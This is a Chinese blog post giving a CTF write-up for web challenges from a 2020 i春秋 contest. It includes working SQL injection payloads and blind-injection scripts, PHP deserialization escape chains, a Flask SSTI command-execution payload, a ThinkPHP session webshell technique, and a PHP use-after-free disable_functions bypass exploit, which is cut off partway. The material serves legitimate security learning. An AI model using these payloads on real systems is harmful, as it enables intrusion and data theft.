<!DOCTYPE html>
<html lang="zh-CN">










<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="">
    <meta name="author" content="chuddy">
    <meta name="keywords" content="">
    <title>&#39;2020新春战疫网络安全公益赛部分web writeup&#39; ~ chuddy&#39;s Blog</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
    
        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
    
</head>

<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
<div class="container">
    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto text-center">
            
            <li class="nav-item">
                <a class="nav-link" href="/">Home</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/archives/">Archives</a>
            </li>
            
        </ul>
    </div>
</div>


</nav>
    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
    <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
        <div class="container text-center white-text wow fadeInUp">
            <p class="h2">'2020新春战疫网络安全公益赛部分web writeup'</p>
            <br>
            
            <p>Saturday, February 22nd 2020, 3:42 pm</p>
            
        </div>
        </div>
    </div>
    </div>
  </header>

  <main>
  
  <div class="container-fluid">
    <div class="row">
        <div class="col-md-8 offset-md-2 ">
            <div class="post-content py-5 z-depth-3 main">
                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近因为疫情，在家里都没怎么出门，正好i春秋平台举办了<code>2020新春战疫网络安全公益赛</code>。学到了一些骚姿势，师傅们都tql了。。。</p>
<h1 id="DAY1"><a href="#DAY1" class="headerlink" title="DAY1"></a>DAY1</h1><h2 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h2><p>打开页面发现是一个登陆框，直接注册账号登陆进去。发现需要管理员登陆，才能解锁新功能。</p>
<p>在那里xss了半天，没有结果。。。。</p>
<p>最后重新回到登陆页面，使用万能密码登陆，发现能登进去，但是是我刚刚注册的账号，于是重新下发题目，，直接万能密码登陆，发现成功登陆了管理员的账号。</p>
<p>在新功能页面，发现存在注入，可以通过联合注入<br>没有任何过滤，就是正常的联合注入，能够注出<code>flag</code><br>测试发现回显的字段在2</p>
<pre><code>1&#39; union select 1,database(),3,4,5#
nzhaopin

1&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()#
backup,flag,user

1&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=database()#

id,safekey,profile,id,flaaag,id,username,password,safekey,profile

1&#39; union select 1,group_concat(flaaag),3,4,5 from flag#
flag{9cbb834c-0562-4503-a703-0d2092a220bc}
</code></pre><h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>比较简单的一道题目<br>打开发现存在文件上传，可以直接上传木马文件。。。</p>
<p>然后执行<code>system(&#39;/readflag&#39;);</code>就可以得到<code>flag</code>了</p>
<p>看了源码，发现是代码写翻车了(2333333)<br><img src="https://s2.ax1x.com/2020/02/24/33BYJx.png" alt="33BYJx.png"></p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>打开页面发现源码：</p>
<pre><code> &lt;?php
    # flag在fl4g里
    include &#39;waf.php&#39;;
    header(&quot;Content-type: text/html; charset=utf-8&quot;); 
    $db = new mysql();

    $id = $_GET[&#39;id&#39;];

    if ($id) {
        if(check_sql($id)){
            exit();
        } else {
            $sql = &quot;select * from flllllllag where id=$id&quot;;
            $db-&gt;query($sql);
        }
    }
    highlight_file(__FILE__);


</code></pre><p>这里我们发现是一个注入，还有<code>waf</code>会对输出的参数进行过滤。  最主要的是这里没有任何的回显数据。。。  我们可以考虑的是延时注入。。<br><code>?id=if(1,sleep(3),1)</code> 可以造成延时的效果。</p>
<p>测试发现过滤了好多东西：<code>&#39;   %   =   &lt;   &gt;   *   into   load_file   outfile   like   union   select   insert</code></p>
<p>发现过滤了一些运算符，我们可以用<code>REGEXP</code>来代替。</p>
<p>这里告诉了我们<code>flag在fl4g里</code> 也省去了我们很多步骤，能够直接获取<code>flag</code></p>
<p>大致试这个思路 <code>1 and if(fl4g REGEXP &quot;a&quot;,sleep(4),1)%23</code>，<br>脚本：</p>
<pre><code>import requests
import time


url = &quot;http://13922ac12da24dc2863fae519bd12b33160484bcc8a748bd.changame.ichunqiu.com/?id=&quot;


str_1 = &#39;0123456789abcdefgl[]-&#39;
flag= &#39;flag{&#39;
for j in range(100):
    print j
    for i in str_1:
        payload = &#39;1%20and%20if(fl4g%20REGEXP%20&quot;&#39;+flag+i+&#39;&quot;,sleep(5),1)%23&#39;
        url_1 = url +payload
        try:
            res = requests.get(url_1,timeout=3)
        except requests.exceptions.ReadTimeout:
            flag += i
            print flag
            break



flag{efa5f746-1914-4013-94c6-44f8184985dd}
</code></pre><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>打开页面，是一个登陆页面，尝试万能密码登陆无果，然后进行目录扫描，发现源码<code>www.zip</code><br><img src="https://s2.ax1x.com/2020/02/23/33JS2j.png" alt="33JS2j.png"></p>
<p>对源码进行审计：</p>
<p>update.php</p>
<pre><code>&lt;?php
require_once(&#39;lib.php&#39;);
echo &#39;&lt;html&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;update&lt;/title&gt;
&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;
&lt;/html&gt;&#39;;
if ($_SESSION[&#39;login&#39;]!=1){
    echo &quot;你还没有登陆呢！&quot;;
}
$users=new User();
$users-&gt;update();
if($_SESSION[&#39;login&#39;]===1){
    require_once(&quot;flag.php&quot;);
    echo $flag;
}

?&gt;

</code></pre><p>只要登陆成功即可获得<code>flag</code>, 所以我们要想办法构造<code>POP链</code></p>
<p>我们来看一下<code>User类</code></p>
<pre><code>class User
{
    public $id;
    public $age=null;
    public $nickname=null;
   ...
    public function update(){
        $Info=unserialize($this-&gt;getNewinfo());
        $age=$Info-&gt;age;
        $nickname=$Info-&gt;nickname;
        $updateAction=new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#39;id&#39;]);
        //这个功能还没有写完 先占坑
    }
    public function getNewInfo(){
        $age=$_POST[&#39;age&#39;];
        $nickname=$_POST[&#39;nickname&#39;];
        return safe(serialize(new Info($age,$nickname)));
    }
    public function __destruct(){
        return file_get_contents($this-&gt;nickname);//危
    }
    public function __toString()
    {
        $this-&gt;nickname-&gt;update($this-&gt;age);
        return &quot;0-0&quot;;
    }
}
</code></pre><p><code>User类</code>里的<code>getNewInfo</code>有一个过滤，就是替换一些危险的函数<br><code>User类</code>存在<code>__destruct</code>和<code>__toString</code>两个魔术方法。<code>destruct</code>直接是文件读取的，而<code>__toString</code>是表示当<code>User</code>当做字符串打出来的时候就会调用这个函数，<code>$this-&gt;nickname-&gt;update($this-&gt;age);</code><br>我们查找一下<code>update</code>方法</p>
<pre><code>class dbCtrl
{
    public function update($sql)
    {
        //还没来得及写
    }
}
</code></pre><p>发现里面没有任何功能，我们就有搜索了一下<code>__call</code>魔术方法<br><code>Info</code>中存在一个<code>__call</code>所以当调用<code>$Info-&gt;update</code>的时候由于<code>Info类</code>中没有<code>update</code>这个方法，所以会触发魔术方法<code>__call</code></p>
<pre><code>class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname){
        $this-&gt;age=$age;
        $this-&gt;nickname=$nickname;
    }   
    public function __call($name,$argument){
        echo $this-&gt;CtrlCase-&gt;login($argument[0]);
    }
}
</code></pre><p>这个<code>__call</code>魔术方法会调用<code>echo $this-&gt;CtrlCase-&gt;login($argument[0]);</code></p>
<p>发现<code>dbCtrl</code>类有<code>login</code>方法</p>
<pre><code>class dbCtrl
{
    ...
    public function login($sql)
    {
        $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);
        if ($this-&gt;mysqli-&gt;connect_error) {
            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);
        }
        $result=$this-&gt;mysqli-&gt;prepare($sql);
        $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);
        $result-&gt;execute();
        $result-&gt;bind_result($idResult, $passwordResult);
        $result-&gt;fetch();
        $result-&gt;close();
        if ($this-&gt;token==&#39;admin&#39;) {
            return $idResult;
        }
        if (!$idResult) {
            echo(&#39;用户不存在!&#39;);
            return false;
        }
        if (md5($this-&gt;password)!==$passwordResult) {
            echo(&#39;密码错误！&#39;);
            return false;
        }
        $_SESSION[&#39;token&#39;]=$this-&gt;name;
        return $idResult;
    }
    public function update($sql)
    {
        //还没来得及写
    }
}
</code></pre><p>这里发现这里的<code>login($sql)</code>是可以被我们控制的。我们可以进行注入得到管理员的密码。</p>
<p>我们看一下这个<code>Info类</code>，</p>
<pre><code>class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname){
        $this-&gt;age=$age;
        $this-&gt;nickname=$nickname;
    }   
    public function __call($name,$argument){
        echo $this-&gt;CtrlCase-&gt;login($argument[0]);
    }
}
</code></pre><p>发现我们能控制的参数只有<code>age</code>和<code>nickname</code>然而这里还多出来了一个属性<code>$CtrlCase</code>，如果我们利用反序列化字符逃逸，是可以控制这个属性的。正好<code>safe</code>这个函数给我们反序列化逃逸有了可能。</p>
<p>构造一下：</p>
<pre><code>&lt;?php
error_reporting(0);
session_start();

class dbCtrl
{   
    public $token;
    public function __construct(){
    $this-&gt;token = &#39;admin&#39;;
    }
} 

function safe($parm){
    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);
    return str_replace($array,&#39;hacker&#39;,$parm);
}
Class Info{
    public $CtrlCase;
    public function __construct(){
        $this-&gt;CtrlCase = new dbCtrl();
    }
}
Class User{
    public $nickname=null;
    public $age=null;
    public function __construct(){
        $this-&gt;nickname = new Info();
        $this-&gt;age=&#39;select password,id from user where username=&quot;admin&quot;&#39;;
    }
}
Class UpdateHelper{
    public $sql;

    public function __construct(){
        $this-&gt;sql= new User();
    }
}

$a = new UpdateHelper();

// echo serialize($a);

$res = &#39;&quot;;s:8:&quot;CtrlCase&quot;;&#39; . serialize($a) . &#39;}&#39; . &quot;\n&quot;;

echo $res;

//&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:{s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:{s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:1:{s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}s:3:&quot;age&quot;;s:51:&quot;select password,id from user where username=&quot;admin&quot;&quot;;}}}
</code></pre><p>这个<code>payload</code>一个222个字符。一个<code>*</code>被过滤成<code>hacker</code>后可以挤出5个字符，选择44个<code>*</code>和三个<code>union</code>，最终组成了<code>payload</code></p>
<pre><code>age=1&amp;nickname=********************************************unionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:{s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:{s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:1:{s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}s:3:&quot;age&quot;;s:51:&quot;select password,id from user where username=&quot;admin&quot;&quot;;}}}
</code></pre><p><img src="https://s2.ax1x.com/2020/02/24/330qqH.png" alt="330qqH.png"></p>
<p>在线解码就可以得到管理员的密码，登陆就i可以得到<code>flag</code>了</p>
<pre><code>flag{aa934a2e-666f-4669-bf94-1e6c6e6d9397}
</code></pre><h1 id="DAY2"><a href="#DAY2" class="headerlink" title="DAY2"></a>DAY2</h1><h2 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h2><p>打开题目，发现给出了源码：</p>
<pre><code> &lt;?php 
    function check($str)
    {
        if(preg_match(&#39;/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i&#39;,$str,$matches))
        {
            print_r($matches);
            return 0;
        }
        else
        {
            return 1;
        }
    }
    try
    {
        $db = new PDO(&#39;mysql:host=localhost;dbname=pdotest&#39;,&#39;root&#39;,&#39;******&#39;);
    } 
    catch(Exception $e)
    {
        echo $e-&gt;getMessage();
    }
    if(isset($_GET[&#39;id&#39;]))
    {
        $id = $_GET[&#39;id&#39;];
    }
    else
    {
        $test = $db-&gt;query(&quot;select balabala from table1&quot;);
        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);
        $id = $res[&#39;balabala&#39;];
    }
    if(check($id))
    {
        $query = &quot;select balabala from table1 where 1=?&quot;;
        $db-&gt;query(&quot;set names gbk&quot;);
        $row = $db-&gt;prepare($query);
        $row-&gt;bindParam(1,$id);
        $row-&gt;execute();
    }

</code></pre><p>发现采用了PDO模式，想到了一个大佬的文章 <a href="https://xz.aliyun.com/t/3950" target="_blank" rel="noopener">PDO场景下的SQL注入探究</a>，发现和这个非常相似。</p>
<p>这里过滤了好多东西</p>
<pre><code>if(preg_match(&#39;/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i&#39;,$str,$matches))
</code></pre><p>发现正常的注入手段都被过滤了。。<br>想到可以利用通过转换十六进制来绕过这些限制。<br>由于页面没有任何回显的地方，所以可以考虑延时注入。<br><code>select sleep(1)</code>的十六进制表示为：<code>0x73656C65637420736C656570283129</code></p>
<pre><code>$db-&gt;query(&quot;set names gbk&quot;);
</code></pre><p>看到这里设置的字符集为<code>gbk</code>,首先想到的就是宽字节注入。</p>
<p>综上，测试发现：</p>
<pre><code>id=1%df%27%20;set%20@x=0x73656C65637420736C656570283129;prepare%20a%20from%20@x;execute%20a;

</code></pre><p>这样能够得到延时的效果</p>
<p>脚本：</p>
<pre><code>import requests 
import re
import time
import sys

reload(sys)
sys.setdefaultencoding(&quot;utf8&quot;)


def str_to_hex(s):
    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])

def hex_to_str(s):
    return &#39;&#39;.join([chr(i) for i in [int(b, 16) for b in s.split(&#39; &#39;)]])


url = &quot;http://c8a6cd9388a04664b7695f43a2489372bae05b16de4e4793.changame.ichunqiu.com//?id=1%df%27%20;set%20@x=0x&quot;
flag = &quot;&quot;
for j in range(1,100):
    print j
    for i in range(32,128):
        # sql = &#39;select if((ascii(substr(database(),&#39;+str(j)+&#39;,1))&gt;&#39;+str(i)+&#39;),1,sleep(100))&#39;
        #payload=&quot;select if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;+str(j)+&quot;,1))=&quot;+str(i)+&quot;),sleep(4),1)&quot;
                #print(payload)
                #payload=&quot;select if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;table1&#39;),&quot;+str(j)+&quot;,1))=&quot;+str(i)+&quot;),sleep(4),1)&quot;
        sql = &quot;select if((ascii(substr((select group_concat(fllllll4g) from table1),&quot;+str(j)+&quot;,1))=&quot;+str(i)+&quot;),sleep(4),1)&quot;
        # print sql
        hex_sql = str_to_hex(sql)
        url_1 = url+hex_sql+&#39;;prepare%20a%20from%20@x;execute%20a;&#39;
        # print url_1
        # exit()
        try:
            res = requests.get(url_1,timeout=4)
        except requests.exceptions.ReadTimeout:
            flag +=chr(i)
            print flag
            break


</code></pre><h2 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h2><p>打开题目发现和强网杯的一道题目特别相似。<br><img src="https://s2.ax1x.com/2020/02/22/3Q83gx.png" alt="3Q83gx.png"><br>但是这个题目的过滤更加严谨：<br>将上次强网杯那道题的思路都给过滤了。。</p>
<pre><code>return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);
</code></pre><p>我们可以查到表名  payload:<code>-1&#39;;show tables;</code>：<br><a href="https://imgchr.com/i/3QGcS1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/22/3QGcS1.png" alt="3QGcS1.png"></a></p>
<p>我们可以发现<code>flag</code>所在的表</p>
<p>通过查阅资料，发现了一个有趣的东西 <code>handler</code> <a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">Mysql查询语句-handler</a></p>
<p><code>handler</code>的使用方法：</p>
<pre><code>mysql&gt; handler user open;
Query OK, 0 rows affected (0.00 sec)

mysql&gt; handler user read first;
+----+-------+-------+
| id | name  | pass  |
+----+-------+-------+
|  1 | admin | admin |
+----+-------+-------+
1 row in set (0.00 sec)

mysql&gt; handler user read next;
+----+------+------+
| id | name | pass |
+----+------+------+
|  2 | root | root |
+----+------+------+
1 row in set (0.00 sec)

mysql&gt; handler user close;
Query OK, 0 rows affected (0.00 sec)
</code></pre><p>我们可以如法炮制一下。</p>
<p>得到payload:</p>
<pre><code>-1&#39;;handler `FlagHere` open;handler `FlagHere` read first;#
</code></pre><p><img src="https://s2.ax1x.com/2020/02/22/3QJpfs.png" alt="3QJpfs.png"></p>
<h2 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h2><p>打开题目<br><img src="https://s2.ax1x.com/2020/02/22/3QthwT.png" alt="3QthwT.png"></p>
<p>发现 输入<code>1</code> 回显 <code>Hello Nu1L</code></p>
<p>输入<code>2</code> 回显<code>Hello CQGAME</code></p>
<p>当我们输入 <code>2-1</code> 回显 <code>Hello Nu1L</code></p>
<p>发现存在注入点。<code>2-(ascii(substr(database(),1,1))&gt;1)</code>这样可以探测到数据库名。</p>
<p>这其中也过滤了一些字符串</p>
<pre><code>sleep,instr,benchmark,format,insert,bin,substring,ord,and,in,or,xor
</code></pre><p>其中<code>union</code>和<code>select</code>单独使用不会被过滤，一起使用会被判定非法字符。。。</p>
<p>由于过滤了<code>in</code>，我们就无法使用<code>information_schema</code>这个库来查询我们想要的表名和字段名了。</p>
<p>我们需要了解一下MySQL5.7的新特性</p>
<pre><code>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。
</code></pre><p>我也找到了一篇文章<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">bypass information_schema</a></p>
<p>通过文章上说讲我们可以通过<code>sys.schema_table_statistics_with_buffer</code>来查询表名。<br>构造payload:</p>
<pre><code>2-(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),1,1))&gt;1)
</code></pre><p>这样我们就可以构造出来表名<code>f1ag_1s_h3r3_hhhhh</code>。</p>
<p>在我们知道表名的情况下，原来的想法是可以进行无列明注入的，但是过滤了<code>union select</code>  <code>join</code>等 弄得很难受</p>
<p>尝试之间发现：<br><code>2 - (ascii(substr((select  count(*) f1ag_1s_h3r3_hhhhh),1,1))=49)</code> 可以得到表中只有一条数据</p>
<p><code>2 - (ascii(substr((select  count(id) f1ag_1s_h3r3_hhhhh),1,1))=49)</code> 可以的得到表存在<code>id</code>值为<code>1</code></p>
<p>在尝试中，发现了一个骚姿势：</p>
<pre><code>mysql&gt; select (select 1,0x01,3)&gt;(select * from user limit 1);
+------------------------------------------------+
| (select 1,0x01,3)&gt;(select * from user limit 1) |
+------------------------------------------------+
|                                              0 |
+------------------------------------------------+
1 row in set (0.00 sec)

mysql&gt; select (select 1,0xff,3)&gt;(select * from user limit 1);
+------------------------------------------------+
| (select 1,0xff,3)&gt;(select * from user limit 1) |
+------------------------------------------------+
|                                              1 |
+------------------------------------------------+
1 row in set (0.00 sec)
</code></pre><p>于是可以尝试得到flag:<br>payload:</p>
<pre><code>2-(select (select 1,0x01)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))

</code></pre><p>最后附上脚本：</p>
<pre><code>import requests


def str_to_hex(s):
    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])

url = &quot;http://86ad8e55dd3244b488826b4cf0924ce4b5a885066be143a0.changame.ichunqiu.com/index.php&quot;
headers = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}


flag=&#39;&#39;


for j in range(1,100):
    for i in range(32,126):
        print i
        payload = &quot;id=2-(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&quot;+str(j)+&quot;,1))&lt;&quot;+str(i)+&quot;)&quot;
        # a = str_to_hex(chr(i))
        # payload = &quot;id=2-(select (select 1,0x&quot;+str_to_hex(flag)+a+&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))&quot;
        res = requests.post(url=url,data=payload,headers=headers)
        # print payload
        # print res.text
        # exit()
        if &quot;Hello Nu1L&quot; in res.text:
                flag += chr(i-1)
                print flag
                break


</code></pre><h1 id="DAY3"><a href="#DAY3" class="headerlink" title="DAY3"></a>DAY3</h1><h2 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h2><p><img src="https://s2.ax1x.com/2020/02/23/33i3p4.png" alt="33i3p4.png"></p>
<p>这是一个base64的加密解密网站</p>
<p>猜测试ssti</p>
<p><code>$2</code>将其base64编码 然后再网站上用解密工具解码得到：</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33AI3D.png" alt="33AI3D.png"></p>
<p>发现有回显，然后就试构造payload:执行命令了。。</p>
<p>这里面也有一些过滤，当输入的存在非法字符时，<br><img src="https://s2.ax1x.com/2020/02/23/33EHRU.png" alt="33EHRU.png"></p>
<p>得到payload:</p>
<pre><code>{{{}.__class__.__base__.__subclasses__()[103].__init__.__globals__['__builtins__']['ev'+'al']("__imp"+"ort_"+"_('o"+"s').po"+"pen('ls').read()")}}
</code></pre><p>能够执行命令：<br><img src="https://s2.ax1x.com/2020/02/23/33Az8S.png" alt="33Az8S.png"></p>
<p>读<code>flag</code>文件: </p>
<pre><code>{{{}.__class__.__base__.__subclasses__()[103].__init__.__globals__['__builtins__']['ev'+'al']("__imp"+"ort_"+"_('o"+"s').po"+"pen('cat this_is_the_fl'+'ag.txt').read()")}}
</code></pre><p><img src="https://s2.ax1x.com/2020/02/23/33Vomd.png" alt="33Vomd.png"></p>
<h2 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h2><p>打开题目：<br><img src="https://s2.ax1x.com/2020/02/23/33np0H.png" alt="33np0H.png"></p>
<p>发现存在源码<code>www.zip</code>，通过测试发现：<br><img src="https://s2.ax1x.com/2020/02/23/33utRP.png" alt="33utRP.png"></p>
<p>是个<code>thinkphp6.0.0</code>这个版本前一段刚爆出来了一个漏洞<a href="https://paper.seebug.org/1114/" target="_blank" rel="noopener">参考链接</a>，探测一波。</p>
<p>我们正常的注册，登陆，发现页面存在查找功能，但是什么也查不到。。。</p>
<p>在<code>http://123.57.212.112:7892/runtime/session/</code>这个目录下，我们找到了存放<code>session</code>的文件。<br><img src="https://s2.ax1x.com/2020/02/23/33KVeg.png" alt="33KVeg.png"></p>
<p>打开对应的文件，发现里面存储的时我们刚刚查找的内容。</p>
<p>于是我们可以上传一个木马文件。</p>
<p>在我们登陆时，修改一下<code>PHPSESSID</code>的值，改成<code>102cf8246d140a73584c0e6c02b8.php</code>，登陆成功之后就会在<code>http://123.57.212.112:7892/runtime/session/</code>这个目录下，找到这个文件，然后就是写马进去。</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33K2tA.png" alt="33K2tA.png"></p>
<p>访问这个文件，发现成功写入木马：</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33K77Q.png" alt="33K77Q.png"></p>
<p>但是执行不了系统命令。。。因为<code>disable_functions</code><br><img src="https://s2.ax1x.com/2020/02/23/33KLhn.png" alt="33KLhn.png"><br>这个禁止使用的太多了<code>mail,error_log</code>这些也被禁用了，只好拿出祖传的神器了。。。</p>
<pre><code>&lt;?php
pwn(&quot;cd / &amp;&amp;./readflag&quot;);
function pwn($cmd) {
    global $abc, $helper;
    function str2ptr(&amp;$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j &gt;= 0; $j--) {
            $address &lt;&lt;= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
    function ptr2str($ptr, $m = 8) {
        $out = &quot;&quot;;
        for ($i=0; $i &lt; $m; $i++) {
            $out .= chr($ptr &amp; 0xff);
            $ptr &gt;&gt;= 8;
        }
        return $out;
    }
    function write(&amp;$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i &lt; $n; $i++) {
            $str[$p + $i] = chr($v &amp; 0xff);
            $v &gt;&gt;= 8;
        }
    }
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper-&gt;a);
        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
        return $leak;
    }
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
        for($i = 0; $i &lt; $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }
        if(!$data_addr || !$text_size || !$data_size)
            return false;
        return [$data_addr, $text_size, $data_size];
    }
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i &lt; $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $text_size) {
                $deref = leak($leak);
                # &#39;constant&#39; constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $text_size) {
                $deref = leak($leak);
                # &#39;bin2hex&#39; constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
            return $data_addr + $i * 8;
        }
    }
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak &amp; 0xfffffffffffff000;
        for($i = 0; $i &lt; 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
    class ryat {
        var $ryat;
        var $chtg;

        function __destruct()
        {
            $this-&gt;chtg = $this-&gt;ryat;
            $this-&gt;ryat = 1;
        }
    }
    class Helper {
        public $a, $b, $c, $d;
    }
    if(stristr(PHP_OS, &#39;WIN&#39;)) {
        die(&#39;This PoC is for *nix systems only.&#39;);
    }
    $n_alloc = 10; # increase this value if you get segfaults
    $contiguous = [];
    for($i = 0; $i &lt; $n_alloc; $i++)
        $contiguous[] = str_repeat(&#39;A&#39;, 79);
    $poc = &#39;a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:&quot;ryat&quot;:2:{s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;}}i:1;i:3;i:2;R:5;}&#39;;
    $out = unserialize($poc);
    gc_collect_cycles();
    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];
    $helper = new Helper;
    $helper-&gt;b = function ($x) { };
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die(&quot;UAF failed&quot;);
    }
    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
